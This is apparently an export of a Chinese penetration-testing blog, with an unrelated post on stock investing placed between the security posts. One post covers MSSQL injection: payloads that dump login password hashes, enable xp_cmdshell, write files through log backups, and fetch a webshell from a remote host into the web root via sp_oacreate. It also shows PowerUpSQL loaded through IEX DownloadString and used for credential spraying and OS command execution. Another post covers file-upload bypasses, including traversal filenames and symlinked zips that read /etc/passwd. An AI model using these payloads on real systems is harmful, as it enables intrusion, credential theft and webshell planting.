<figure class="highlight oxygene"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> top <span class="number">1</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> column_name <span class="keyword">not</span> <span class="keyword">in</span> (<span class="keyword">select</span> top <span class="number">1</span> column_name <span class="keyword">from</span> information_schema.columns))</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name %<span class="number">2</span>b<span class="string">','</span><span class="keyword">from</span> information_schema.tables <span class="keyword">for</span> <span class="keyword">xml</span> <span class="keyword">path</span>(<span class="string">''</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">and 1=0;<span class="keyword">begin</span></span><br><span class="line"><span class="keyword">declare</span> @xy <span class="built_in">varchar</span>(<span class="number">8000</span>) <span class="keyword">set</span> @xy=<span class="string">';'</span></span><br><span class="line"><span class="keyword">select</span> @xy=@xy + <span class="string">''</span> +<span class="keyword">name</span> <span class="keyword">from</span> sysobjects <span class="keyword">where</span> xtype=<span class="string">'U'</span> <span class="keyword">and</span> <span class="keyword">name</span> &gt; @xy</span><br><span class="line"><span class="keyword">select</span> @xy <span class="keyword">as</span> xy <span class="keyword">into</span> TMP_DB</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<h4 id="获取用户账号和hash"><a href="#获取用户账号和hash" class="headerlink" title="获取用户账号和hash"></a>获取用户账号和hash</h4><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">select name,master<span class="selector-class">.sys</span><span class="selector-class">.fn_sqlvarbasetostr</span>(password_hash) from master<span class="selector-class">.sys</span><span class="selector-class">.sql_logins</span></span><br></pre></td></tr></table></figure>

<h3 id="权限探测"><a href="#权限探测" class="headerlink" title="权限探测"></a>权限探测</h3><p>1.多语句注入 </p>
<p>mysql条件比较苛刻，而msqql没那么苛刻</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">Ph0rse1' ;exec xp_cmdshell <span class="symbol">'whoami</span> &gt; c:\tmp\<span class="number">1</span>.txt' <span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-13.png" alt="mssql-13"></p>
<p>执行xp_cmdshell之前需判断是否开启xp_cmdshell存储过程</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">从MSSQL2005版本之后默认关闭</span><br><span class="line">1' and 1=(<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> master..sysobjects <span class="keyword">where</span> xtype=<span class="string">'X'</span>  <span class="keyword">and</span> <span class="keyword">name</span>=<span class="string">'xp_cmdshell'</span>)<span class="comment">--</span></span><br><span class="line">若报错，则没有开启</span><br><span class="line">正常回显，则表示开启</span><br></pre></td></tr></table></figure>

<p>xp_cmdshell开启语句</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> sp_configure <span class="string">'show advanced options'</span> ,1 ;</span><br><span class="line">reconfigure;</span><br><span class="line"><span class="built_in">exec</span> sp_configure <span class="string">'xp_cmdshell'</span> ,1 ;</span><br><span class="line">reconfigure;</span><br></pre></td></tr></table></figure>

<figure class="highlight scilab"><table><tr><td class="code"><pre><span class="line">Ph0rse1' ; <span class="built_in">exec</span> sp_configure <span class="string">'show advanced options'</span>  ,<span class="number">1</span> ; reconfigure; <span class="built_in">exec</span> sp_configure <span class="string">'xp_cmdshell'</span>   ,<span class="number">1</span> ; reconfigure;--+</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-14.png" alt="mssql-14"></p>
<p>在开启xp_cmdshell情况下执行<code>whoami &gt; c:\tmp\1.txt</code>命令后查看1.txt文件如下</p>
<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-15.png" alt="mssql-15"></p>
<p>2.tmp临时表</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">create <span class="selector-tag">table</span> <span class="selector-id">#MyTempTable</span> (cola int primary key)</span><br></pre></td></tr></table></figure>

<h3 id="从写文件到getshell"><a href="#从写文件到getshell" class="headerlink" title="从写文件到getshell"></a>从写文件到getshell</h3><h4 id="转存入表"><a href="#转存入表" class="headerlink" title="转存入表"></a>转存入表</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> mydata (line <span class="built_in">varchar</span>(<span class="number">8000</span>));</span><br><span class="line">bulk <span class="keyword">insert</span> mydata <span class="keyword">from</span> <span class="string">'c:/tmp/1.txt'</span>;   <span class="comment">#使用之前xp_cmdshell写入的1.txt文件写入表</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> mydata;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> mydata;</span><br></pre></td></tr></table></figure>

<p><img src="/Users/c0cho/hexo/source/_posts/MsSQL%E6%B3%A8%E5%85%A5/mssql-16.png" alt="mssql-16"></p>
<h4 id="16进制转换绕过"><a href="#16进制转换绕过" class="headerlink" title="16进制转换绕过"></a>16进制转换绕过</h4><p>首先创建数据库</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">begin</span></span><br><span class="line"><span class="keyword">declare</span> @xy <span class="built_in">varchar</span>(<span class="number">8000</span>) <span class="keyword">set</span> @xy=<span class="string">';'</span></span><br><span class="line"><span class="keyword">select</span> @xy=@xy + <span class="string">''</span> +<span class="keyword">name</span> <span class="keyword">from</span> sysobjects <span class="keyword">where</span> xtype=<span class="string">'U'</span> <span class="keyword">and</span> <span class="keyword">name</span> &gt; @xy</span><br><span class="line"><span class="keyword">select</span> @xy <span class="keyword">as</span> xy <span class="keyword">into</span> TMP_DB</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>创建成功，可查询</p>
<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-17.png" alt="mssql-17"></p>
<p>如下数据转换为16进制，注意空格数据，有时候需要自己加空格的16进制内容</p>
<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-18.png" alt="mssql-18"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">' and 1=0; <span class="keyword">declare</span> @S <span class="built_in">varchar</span>(<span class="number">4000</span>) <span class="keyword">set</span> @S=<span class="keyword">CAST</span>(<span class="number">0x44524f50205441424c4520544d505f44423b</span> <span class="keyword">AS</span> <span class="built_in">VARCHAR</span>(<span class="number">4000</span>)); exec (@S);</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-19.png" alt="mssql-19"></p>
<p>####绕过引号</p>
<p>select * from users where username=char(97)+char(100)+char(109)+char(105)+char(110)</p>
<h4 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h4><h5 id="xp-cmdshell-执行系统命名写入文件"><a href="#xp-cmdshell-执行系统命名写入文件" class="headerlink" title="xp_cmdshell 执行系统命名写入文件"></a>xp_cmdshell 执行系统命名写入文件</h5><p><code>whoami</code>查看MSSQL权限，若MSSQL以WIndows身份验证的方式运行，则获取的权限为启动身份。若为sa账号，则使用的是<code>nt service\mssqlserver</code>服务权限，但这并不是系统的一个用户，而只是一个服务。它们在Windows中有安全标识符（SID），但并不是真正的用户</p>
<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-24.png" alt="mssql-24"></p>
<p>服务权限下无法添加用户</p>
<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-25.png" alt="mssql-25"></p>
<p>使MSSQL以WIndows身份验证的方式运行，找到MSSQL服务</p>
<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-26.png" alt="mssql-26"></p>
<p>勾选如下选项</p>
<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-27.png" alt="mssql-27"></p>
<p>以管理员身份重启后如下</p>
<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-28.png" alt="mssql-28"></p>
<p>可执行用户添加命令</p>
<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-29.png" alt="mssql-29"></p>
<h3 id="dbowner权限下进行扩展攻击利用"><a href="#dbowner权限下进行扩展攻击利用" class="headerlink" title="dbowner权限下进行扩展攻击利用"></a>dbowner权限下进行扩展攻击利用</h3><p>先做一次数据库备份，如下</p>
<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-21.png" alt="mssql-21"></p>
<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-22.png" alt="mssql-22"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">;<span class="keyword">alter</span> <span class="keyword">database</span> news <span class="keyword">set</span> <span class="keyword">RECOVERY</span> <span class="keyword">FULL</span> <span class="comment">--</span></span><br><span class="line">;<span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">test</span>(<span class="keyword">str</span> image)<span class="comment">--</span></span><br><span class="line">;<span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">test</span>(<span class="keyword">str</span>)<span class="keyword">values</span>(<span class="string">'恶意代码'</span>)<span class="comment">--</span></span><br><span class="line">;<span class="keyword">backup</span> <span class="keyword">log</span> news <span class="keyword">to</span> disk =<span class="string">'c:\tmp\test.txt'</span> <span class="keyword">with</span> init<span class="comment">--</span></span><br></pre></td></tr></table></figure>

<p>上述代码执行后查看test.txt文件如下，实际场景利用为写入恶意文件</p>
<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-23.png" alt="mssql-23"></p>
<h3 id="sp-oacreate下权利用限"><a href="#sp-oacreate下权利用限" class="headerlink" title="sp_oacreate下权利用限"></a>sp_oacreate下权利用限</h3><p>启用sp_oacreate组件</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">sp_configure 'show advanced options',1;</span><br><span class="line">GO</span><br><span class="line">RECONFIGURE;</span><br><span class="line">GO=</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-30.png" alt="mssql-30"></p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">sp_configure <span class="string">'Ole Automation Procedures'</span>,<span class="number">1</span><span class="comment">;</span></span><br><span class="line">GO</span><br><span class="line">RECONFIGURE<span class="comment">;</span></span><br><span class="line">GO</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-31.png" alt="mssql-31"></p>
<p>执行如下代码写入webshell</p>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line">;DECLARE <span class="meta">@B</span> varbinary(<span class="number">8000</span>),<span class="meta">@hr</span> <span class="built_in">int</span>,<span class="meta">@http</span> INT,<span class="meta">@down</span> INT </span><br><span class="line">exec sp_oacreate[Microsoft.XMLHTTP],<span class="meta">@http</span> output </span><br><span class="line">EXEC <span class="meta">@hr</span>=sp_oamethod <span class="meta">@http</span>,[Open],<span class="keyword">null</span>,[GET],[http:<span class="comment">//192.168.64.2/muma.txt],0   #远程webshell</span></span><br><span class="line">EXEC <span class="meta">@hr</span>=sp_oamethod <span class="meta">@http</span>,[Send],<span class="keyword">null</span> EXEC <span class="meta">@hr</span>=sp_OAGetProperty <span class="meta">@http</span>,[responseBody],<span class="meta">@B</span> output EXEC <span class="meta">@hr</span>=sp_oacreate [ADODB.Stream],<span class="meta">@down</span> output </span><br><span class="line">EXEC <span class="meta">@hr</span>=sp_OASetProperty <span class="meta">@down</span>,[<span class="built_in">Type</span>],<span class="number">1</span></span><br><span class="line">EXEC <span class="meta">@hr</span>=sp_OASetProperty <span class="meta">@down</span>,[mode],<span class="number">3</span> EXEC <span class="meta">@hr</span>=sp_oamethod <span class="meta">@down</span>,[Open],<span class="keyword">null</span> </span><br><span class="line">EXEC <span class="meta">@hr</span>=sp_oamethod <span class="meta">@down</span>,[Write],<span class="keyword">null</span>,<span class="meta">@B</span> EXEC <span class="meta">@hr</span>=sp_oamethod <span class="meta">@down</span>,[SaveToFile],<span class="keyword">null</span>,[C:\mssqli-test\muma.aspx],<span class="number">1</span>   #写入位置</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-32.png" alt="mssql-32"></p>
<p>webshell写入成功</p>
<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-33.png" alt="mssql-33"></p>
<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-34.png" alt="mssql-34"></p>
<p>蚁剑连接成功，需要注意此处使用<code>http://172.16.237.156/muma.apsx</code>未成功，查看链接地址为``<a href="http://172.16.237.156/muma`可以访问，同时链接成功，实际为省略aspx后缀" target="_blank" rel="noopener">http://172.16.237.156/muma`可以访问，同时链接成功，实际为省略aspx后缀</a></p>
<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-35.png" alt="mssql-35"></p>
<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-36.png" alt="mssql-36"></p>
<h3 id="OPENROWEST绕过Web限制"><a href="#OPENROWEST绕过Web限制" class="headerlink" title="OPENROWEST绕过Web限制"></a>OPENROWEST绕过Web限制</h3><p>无法直接连接远程数据库，并无法使用多语句注入时，就需要再Web端，执行xp_cmdshell之类命令。但由于语法限制，DML语句中无法直接调用DCL语句。因此，这时就需要使用OPENROWEST来绕过限制。</p>
<p>OPENROWEST包含访问OLE DB数据源中的远程数据所需所有连接信息，并可以在查询的from子句中引用，就好像它是一个表名。</p>
<p>环境比较难搭建，暂时附上参考链接，后续有需要再搭建环境测试</p>
<p><a href="https://www.moonsec.com/archives/125" target="_blank" rel="noopener">https://www.moonsec.com/archives/125</a></p>
<p>也可以使用如下代码执行xp_cmdshell</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line">select * from openrowset ('sqloledb','数据库地址';'数据库用户名';'数据库密码','set fmtonly off<span class="built_in"> execute </span>master..xp_cmdshell <span class="string">"dir"</span>');</span><br></pre></td></tr></table></figure>

<p>###其他存储过程使用</p>
<h4 id="system权限"><a href="#system权限" class="headerlink" title="system权限"></a>system权限</h4><p>xp_regwite 操作注册表</p>
<p>sp_makewebtask 写入一句话木马</p>
<p>sp_oacreate  存储远程下载文件</p>
<p>sp_addlogin 扩展管理数据库用户</p>
<h3 id="MSSQL注入参考"><a href="#MSSQL注入参考" class="headerlink" title="MSSQL注入参考"></a>MSSQL注入参考</h3><p><a href="http://blog.sina.com.cn/s/blog_c71409200101fb3u.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_c71409200101fb3u.html</a></p>
<p><a href="https://www.cnblogs.com/vigarbuaa/p/3371500.html" target="_blank" rel="noopener">https://www.cnblogs.com/vigarbuaa/p/3371500.html</a></p>
<p><a href="https://blog.csdn.net/weixin_34319999/article/details/92479895" target="_blank" rel="noopener">https://blog.csdn.net/weixin_34319999/article/details/92479895</a></p>
<p><a href="https://www.anquanke.com/post/id/156911?from=groupmessage" target="_blank" rel="noopener">https://www.anquanke.com/post/id/156911?from=groupmessage</a></p>
<h3 id="PowerUpSQL使用"><a href="#PowerUpSQL使用" class="headerlink" title="PowerUpSQL使用"></a>PowerUpSQL使用</h3><h4 id="设置允许外部脚本"><a href="#设置允许外部脚本" class="headerlink" title="设置允许外部脚本"></a>设置允许外部脚本</h4><p>set-executionpolicy remotesigned</p>
<h4 id="安装方式一-安装模块"><a href="#安装方式一-安装模块" class="headerlink" title="安装方式一 安装模块"></a>安装方式一 安装模块</h4><p>install-module -name powerupsql</p>
<h4 id="安装方式二-下载github项目文件-移动到相关路径-执行以下命令"><a href="#安装方式二-下载github项目文件-移动到相关路径-执行以下命令" class="headerlink" title="安装方式二 下载github项目文件 移动到相关路径 执行以下命令"></a>安装方式二 下载github项目文件 移动到相关路径 执行以下命令</h4><p>import-module powerupsql.psd1</p>
<h4 id="安装方式三-导入函数"><a href="#安装方式三-导入函数" class="headerlink" title="安装方式三 导入函数"></a>安装方式三 导入函数</h4><p>IEX(New-Object System.Net.WebClient).DownloadString(“<a href="https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1&quot;" target="_blank" rel="noopener">https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1&quot;</a>)</p>
<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-37.png" alt="mssql-37"></p>
<h4 id="安装方式四-CS加载"><a href="#安装方式四-CS加载" class="headerlink" title="安装方式四 CS加载"></a>安装方式四 CS加载</h4><p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-38.png" alt="mssql-38"></p>
<h4 id="查看信息"><a href="#查看信息" class="headerlink" title="查看信息"></a>查看信息</h4><figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Get</span>-SQLInstanceLocal -<span class="keyword">Verbose</span></span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-39.png" alt="mssql-39"></p>
<h4 id="连接数据库"><a href="#连接数据库" class="headerlink" title="连接数据库"></a>连接数据库</h4><figure class="highlight coq"><table><tr><td class="code"><pre><span class="line">$Targets = Get-SQLInstanceDomain -<span class="keyword">Verbose</span> | <span class="type">Get</span>-SQLConnectionTestThreaded -<span class="keyword">Verbose</span> -Threads <span class="number">10</span> -username sa -password <span class="number">123.</span>com | <span class="type">Where</span>-Object &#123;$<span class="keyword">_</span>.Status -like <span class="string">"Accessible"</span>&#125;</span><br><span class="line"></span><br><span class="line">$Targets</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-40.png" alt="mssql-40"></p>
<h4 id="升级为sa权限"><a href="#升级为sa权限" class="headerlink" title="升级为sa权限"></a>升级为sa权限</h4><figure class="highlight coq"><table><tr><td class="code"><pre><span class="line">Invoke-SQLEscalatePriv -<span class="keyword">Verbose</span> -<span class="keyword">Instance</span> XUANJIANWEAPO</span><br></pre></td></tr></table></figure>

<h4 id="把整个数据库扒下来后审计"><a href="#把整个数据库扒下来后审计" class="headerlink" title="把整个数据库扒下来后审计"></a>把整个数据库扒下来后审计</h4><figure class="highlight coq"><table><tr><td class="code"><pre><span class="line">Invoke-SQLDumpInfo -<span class="keyword">Verbose</span> -<span class="keyword">Instance</span> XUANJIANWEAPO</span><br></pre></td></tr></table></figure>

<h4 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><figure class="highlight coq"><table><tr><td class="code"><pre><span class="line">$Targets | <span class="type">Invoke</span>-SQLOSCmd -<span class="keyword">Verbose</span> -Command <span class="string">"Whoami"</span> -Threads <span class="number">10</span></span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/03/19/MsSQL注入/mssql-41.png" alt="mssql-41"></p>
<h4 id="其他使用方式"><a href="#其他使用方式" class="headerlink" title="其他使用方式"></a>其他使用方式</h4><p>登录session：<code>$Target</code></p>
<p>提权命令：<code>Invoke-SQLmpersonateServ</code>、<code>Invoke-SQLAudit</code>、<code>Invoke-SQLEscalatePriv</code></p>
<p>执行系统命令：<code>Invoke-SQLOSCmd、</code>Invoke-SQLOSPython`</p>
<p>内网探测：<code>Get-SQLInstanceBroadcast</code>、<code>Get-SQLInstanceScanUDPThreaded</code>、Get-SQLInstanceFile</p>
<h4 id="PowerUpSQL使用参考"><a href="#PowerUpSQL使用参考" class="headerlink" title="PowerUpSQL使用参考"></a>PowerUpSQL使用参考</h4><p><a href="https://github.com/NetSPI/PowerUpSQL/" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/</a></p>
<p><a href="https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet</a></p>
<p><a href="https://www.freebuf.com/column/172122.html" target="_blank" rel="noopener">https://www.freebuf.com/column/172122.html</a></p>
]]></content>
      <categories>
        <category>Sql injection</category>
      </categories>
      <tags>
        <tag>mssql</tag>
      </tags>
  </entry>
  <entry>
    <title>无风险套利-序</title>
    <url>/2020/03/04/%E6%97%A0%E9%A3%8E%E9%99%A9%E5%A5%97%E5%88%A9-%E5%BA%8F/</url>
    <content><![CDATA[<p>打算写一系列无风险套利文章。最近股市行情大好，问我股票的人多了起来。但我并不想予人推荐股票，因为即便是牛市，亏钱的人只会比熊市更多，而且亏得金额更大。由于牛市的一时情绪高涨，投得钱越来越多，杠杆越加越大，到了高位满仓满融，牛市正好结束，独留你在山顶欣赏风景。之前有在个别好友群和朋友之间推荐股票和基金，实盘推荐股票，清晰的买卖点，但最后大多数人都亏钱了，资金量越大，亏得越多。主要原因：</p><a id="more"></a>
<ul>
<li>推荐的时候不在意或者不看好，或拿了很久没涨就调仓换股，直到开始大涨暴涨就开始犹豫要不要进，一直不进一直涨，终于忍不住进了，庄家已经把货出完了，你就在山顶站岗，庄家们已经把人性琢磨的非常透彻了。不追高永远是对的。</li>
<li>拿不住大牛股，只要在这个市场，多多少少拥有过大牛股，只是拿不住。大多数情况下，我们能长年那住亏损的股票，因为接受不了亏损。但大部分人还是拿不住大涨的股，一般涨了20%-30%就会卖掉，认为20%-30%利润就足矣，然后去买其他股，直到被深深套牢。你要知道你手中涨了20%-30%的股有可能能涨到200%-300%甚至更多。亚马逊上市20年时涨了几千倍，腾讯上市至今涨了几百倍，就算在被人诟病的A股，也有当年东方财富80倍，现在的诚迈科技10倍行情，而且非常多。所以作为散户，也要有自己的交易策略，设置好止损点，而盈利的股票可以跟着趋势多拿一段时间，不需要太在意短期的波动。</li>
<li>十人炒股七亏二平一赚。股民数量实在是太庞大了，在十个人中赚钱的那一个人集合起来又可以分为三六九等，这些人中肯定是有一人比其他九个人赚得钱加起来还多，以此类推，真正赚大钱的只是极少数一部分人。</li>
<li>世界一直在变，不变的只有人性。人的贪嗔痴慢疑在股市会被放大，庄家就像一个冷血的杀手，利用人性的弱点，一次一次来回割韭菜，我们每次都会认为这次不一样，其实每次都一样。</li>
</ul>
<p>所以，综上所述，我认为大多数人还是不太适合玩股票，暴涨暴跌的时候还特别容易影响上班工作的心情。如果非得玩，我觉得玩得最早越好，最近看到b站一些还在上学的小女生炒股，一天亏了800多块钱就哭得稀里哗啦的，因为妹子说800块钱是她好几顿饭钱了，也没其他收入，亏了着实让人心疼。我也觉得学生时代，或者毕业两年内的工作族炒股非常好。这个时候可以把所有的钱拿去炒股，全部亏完也无所谓，多年后回过头来看这些都是小钱，总比几十年后事业有成全部亏完进入万劫不复好。如果有这方面的才能，收益不错，优化一下交易模式，当作一份额外收入也是极好的。</p>
<p>前面扯得有点太多了，写本系列的主要目的还是分享和总结一些无风险套利机会。这类机会套利机会一直有对身边的朋友和同事讲，有些听进去了，默默坚持下去获得了不错的收益，有些无所谓，有些手把手教了都懒得去做，可能家里有矿吧。后续内容包括但不限于基金定投，场内外ETF推荐，港股打新策略，打新债策略，A股打新策略，保险等等内容和一些公众号，知识星球，app和一些数据查询工具推荐。</p>
<p>最好的学习方法是分享，写这个系列有两个好处：</p>
<ul>
<li>可以初步形成自己的投资理财体系</li>
<li>方便自己查询和需要投资理财的朋友学习和查询</li>
</ul>
<p>此系列内容，有缘人得之。</p>
]]></content>
      <categories>
        <category>无风险套利</category>
      </categories>
      <tags>
        <tag>序</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传高级利用</title>
    <url>/2020/02/29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%AB%98%E7%BA%A7%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h2 id="文件上传高级利用与绕过技巧"><a href="#文件上传高级利用与绕过技巧" class="headerlink" title="文件上传高级利用与绕过技巧"></a>文件上传高级利用与绕过技巧</h2><p>###重绘图</p><p>正常图片上传后会重新渲染，会抹去代码加入部分。具体绕过方法可以参考上一篇upload-labs总结</p><p>使用工具绕过。</p><p>项目地址</p><p><a href="https://github.com/RickGray/Bypass-PHP-GD-Process-To-RCE" target="_blank" rel="noopener">https://github.com/RickGray/Bypass-PHP-GD-Process-To-RCE</a></p><p>用法</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php codeinj.php demo.gif <span class="string">"&lt;?php phpinfo();?&gt;"</span></span><br></pre></td></tr></table></figure><a id="more"></a>







<h3 id="结合phpinfo与本地文件包含利用"><a href="#结合phpinfo与本地文件包含利用" class="headerlink" title="结合phpinfo与本地文件包含利用"></a>结合phpinfo与本地文件包含利用</h3><p>某站点存在本地文件包含及phpinfo，可以利用其执行脚本。</p>
<p>1.php在解析multipart/form-data请求时，会创建临时文件，并写入上传内容，脚本执行后即删除</p>
<p>2.phpinfo可以输出$_FILE信息</p>
<p>3.通过多种方式争取时间，在临时文件删除前进行执行包含</p>
<p>1）通过在数据报文中加入大量的垃圾数据，似phpinfo页面过大，导致phpinfo页面过大，导致php输出进入流式输出，并不一次输出完毕</p>
<p>2）通过大量请求来延迟php脚本的执行速度</p>
<p>项目地址</p>
<p><a href="http://github.com/hxer/vulnapp.git" target="_blank" rel="noopener">http://github.com/hxer/vulnapp.git</a></p>
<h3 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Directory</span> "<span class="attr">D:</span>/<span class="attr">www</span>/<span class="attr">ichunqiu</span>/<span class="attr">upload</span>"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> "\<span class="attr">.</span>(?<span class="attr">i:php</span>|<span class="attr">php3</span>|<span class="attr">php4</span>)$"</span></span><br><span class="line"><span class="tag"><span class="attr">Order</span> <span class="attr">Allow.Deny</span></span></span><br><span class="line"><span class="tag"><span class="attr">Deny</span> <span class="attr">from</span> <span class="attr">all</span></span></span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>以上代码为在upload下无权限访问php，php3，php4等文件</p>
<p>首先判断目录是否为权限限制</p>
<p>访问如下url显示Forbidden</p>
<p><img src="//choge.top/2020/02/29/文件上传高级利用/up-1.png" alt="up-1"></p>
<p>上传图片正常访问如下</p>
<p><img src="//choge.top/2020/02/29/文件上传高级利用/up-2.png" alt="up-2"></p>
<p>访问不存在的图片显示Not Found</p>
<p><img src="//choge.top/2020/02/29/文件上传高级利用/up-3.png" alt="up-3"></p>
<p>以上访问过程可判断次目录无法访问php文件</p>
<p>继续向上级目录访问<img src="//choge.top/2020/02/29/文件上传高级利用/up-4.png" alt="up-4"></p>
<p><img src="//choge.top/2020/02/29/文件上传高级利用/up-5.png" alt="up-5"></p>
<p>以上图片判断upload目录也没有php访问权限</p>
<p>直道测试到ichunqiu目录有访问权限</p>
<p>上传图片bp抓包，file处修改为<code>file/../../</code>进行目录穿越上传成功</p>
<p><img src="//choge.top/2020/02/29/文件上传高级利用/up-6.png" alt="up-6"></p>
<p>如果碰到waf情况拦截<code>../</code>可以使用<code>.././../</code>进行绕过<code>./</code>代表当前目录</p>
<p><img src="//choge.top/2020/02/29/文件上传高级利用/up-7.png" alt="up-7"></p>
<h3 id="在线解压缩"><a href="#在线解压缩" class="headerlink" title="在线解压缩"></a>在线解压缩</h3><h4 id="Webshll打包到压缩包中"><a href="#Webshll打包到压缩包中" class="headerlink" title="Webshll打包到压缩包中"></a>Webshll打包到压缩包中</h4><p>1.模板上传处常用压缩包上传后进行自动解压</p>
<p>1.1.部分此类有监测压缩包中的内容的，可尝试建立目录进行压缩</p>
<p>2.使用目录穿越<code>../</code>的方法向上一级目录进行上传</p>
<p>将php文件直接压缩为zip，然后用notepad++打开压缩文件如下</p>
<p><img src="//choge.top/2020/02/29/文件上传高级利用/up-8.png" alt="up-8"></p>
<p>讲phpinfo改为../info，如下图</p>
<p><img src="//choge.top/2020/02/29/文件上传高级利用/up-9.png" alt="up-9"></p>
<p>文件上传</p>
<p><img src="//choge.top/2020/02/29/文件上传高级利用/up-10.png" alt="up-10"></p>
<p>成功上传并穿越目录</p>
<p><img src="//choge.top/2020/02/29/文件上传高级利用/up-11.png" alt="up-11"></p>
<h4 id="将文件软链接打包到压缩包"><a href="#将文件软链接打包到压缩包" class="headerlink" title="将文件软链接打包到压缩包"></a>将文件软链接打包到压缩包</h4><p>文件软链接到/etc/passwd等文件，达到任意文件读取</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ln -s /etc/passwd ./a   #文件/etc/pawwsd软链接到a</span><br><span class="line">zip --symlinks -r 1.zip ./a  #将a文件压缩为1.zip</span><br></pre></td></tr></table></figure>

<p>上传成功</p>
<p><img src="//choge.top/2020/02/29/文件上传高级利用/up-12.png" alt="up-12"></p>
<p>点击a查看到/etc/passwd文件</p>
<p><img src="//choge.top/2020/02/29/文件上传高级利用/up-13.png" alt="up-13"></p>
<p>文件软链接到/文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ln -s / b    #/软链接到b</span><br><span class="line">zip --symlinks 2.zip b  #将b压缩为2.zip</span><br></pre></td></tr></table></figure>

<p>上传2.zip，上传成功</p>
<p><img src="//choge.top/2020/02/29/文件上传高级利用/up-14.png" alt="up-14"></p>
<p>点击b显示目录</p>
<p><img src="//choge.top/2020/02/29/文件上传高级利用/up-15.png" alt="up-15"></p>
<h3 id="其他技巧"><a href="#其他技巧" class="headerlink" title="其他技巧"></a>其他技巧</h3><h4 id="图片文件头十六进制匹配"><a href="#图片文件头十六进制匹配" class="headerlink" title="图片文件头十六进制匹配"></a>图片文件头十六进制匹配</h4><p>一般检查文件头内容是加入gif89a即可，但部分后台有可能需要强制匹配文件头的16进制数据</p>
<p>如需要匹配下图中的<code>\xff\xd8\xff</code></p>
